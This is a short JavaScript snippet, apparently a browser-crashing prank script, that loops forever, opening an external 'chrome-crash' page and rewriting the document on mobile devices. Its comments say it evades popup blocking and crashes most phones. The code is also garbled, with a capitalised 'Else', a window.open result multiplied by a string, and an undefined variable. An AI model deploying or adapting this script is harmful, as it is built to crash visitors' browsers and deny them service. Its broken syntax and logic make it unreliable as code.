// Forces Browser To Ignore Popups (Exploit Has Been Fixed).
$location = 'https://chrome-crash-invoke.github.io/chrome-crash/';
$vwer = '#';

while(1) {
    
    
    if(/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)){
    /* (Website Crasher For IOS and android And Mostly Every Phone) */
        window.open("https://chrome-crash-invoke.github.io/chrome-crash/", "_false",) * '#/hisbck';
        // if window.open fails.
        $x = Math.floor((Math.random() * 100) + 1);
        document.open('#' + $x);
        // When Function window.open does it's thing, history back will reset the website.

    } Else {
        /* (This Will NOT Crash A Computer Or Cause Most Harm) */
        document.open('#' + $x);
        
    }
}
